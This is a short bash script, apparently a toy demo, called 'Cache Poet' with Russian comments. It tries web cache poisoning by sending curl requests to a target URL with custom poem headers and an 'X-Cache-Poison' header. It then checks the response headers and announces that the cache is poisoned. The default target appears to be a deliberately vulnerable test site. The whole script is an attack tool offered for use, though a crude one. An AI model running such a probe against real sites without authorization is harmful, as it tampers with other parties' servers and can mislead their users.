#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🔴 CACHE POET — Отравитель кэша           ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Техника: отправляем безобидные стихи в заголовках которые кэшируются
POEMS=(
    "X-Poem: Roses are red, violets are blue"
    "X-Poem: The server is slow, the cache is too"
    "X-Poem: I send this request, with love and care"
    "X-Poem: And poison your cache, beyond repair"
)

for poem in "${POEMS[@]}"; do
    curl -sk --max-time 3 -H "$poem" -H "X-Cache-Poison: true" "$TARGET" -o /dev/null -w "  📝 HTTP %{http_code}\n" 2>/dev/null
done

# Проверяем, закэшировался ли наш стих
curl -sk --max-time 3 -I "$TARGET" 2>/dev/null | grep -i "x-poem\|x-cache" && echo "  💀 КЭШ ОТРАВЛЕН СТИХАМИ!"
echo "[CACHE POET] ✅ Атака завершена"
